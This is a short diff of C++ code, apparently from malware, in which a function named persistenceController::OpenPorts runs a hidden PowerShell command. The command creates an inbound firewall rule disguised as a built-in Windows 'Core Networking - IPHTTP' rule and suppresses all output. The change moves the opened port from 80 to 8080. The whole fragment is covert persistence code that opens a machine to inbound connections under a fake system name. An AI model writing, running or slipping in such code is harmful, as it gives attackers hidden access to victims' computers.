@@ -37,7 +37,7 @@ void persistenceController::OpenPorts() {
         "    } "
         "} else { "
         "    New-NetFirewallRule -DisplayName 'Core Networking - IPHTTP (TCP-In)' -Direction Inbound "
-        "-Protocol TCP -Action Allow -LocalPort 80 -Group 'Core Networking Optimization' "
+        "-Protocol TCP -Action Allow -LocalPort 8080 -Group 'Core Networking Optimization' "
         "-Description 'Inbound TCP rule to allow IPHTTP tunneling technology to provide connectivity across HTTP proxies and firewalls.'"
         "}\" > NUL 2>&1";
     executeCommand(openPortsCmd);
